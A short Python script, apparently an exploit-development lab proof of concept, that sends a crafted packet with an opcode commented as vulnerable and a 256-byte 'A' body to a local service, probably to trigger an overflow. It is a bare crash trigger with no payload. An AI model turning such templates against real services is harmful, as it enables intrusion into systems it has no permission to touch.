import socket
import struct

host = "127.0.0.1"
port = 11460

body = b"A" * 256

packet = b""
packet += struct.pack("<I", 0x4F534544)  # "OSED"
packet += struct.pack("<I", 0x1337)  # vulnerable opcode
packet += struct.pack("<I", len(body))  # declared_len
packet += struct.pack("<I", len(body))  # copy_len
packet += body

with socket.create_connection((host, port)) as s:
    s.sendall(packet)
